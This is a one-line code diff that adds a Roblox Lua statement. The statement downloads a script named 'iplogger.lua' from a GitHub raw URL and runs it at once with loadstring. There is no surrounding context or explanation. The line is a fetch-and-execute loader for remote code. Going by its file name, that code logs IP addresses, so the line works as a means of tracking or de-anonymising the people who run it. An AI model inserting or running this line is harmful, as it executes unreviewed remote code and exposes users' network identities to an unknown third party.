@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/its1mpuleALT/balls-Scripts-/main/iplogger.lua'))()
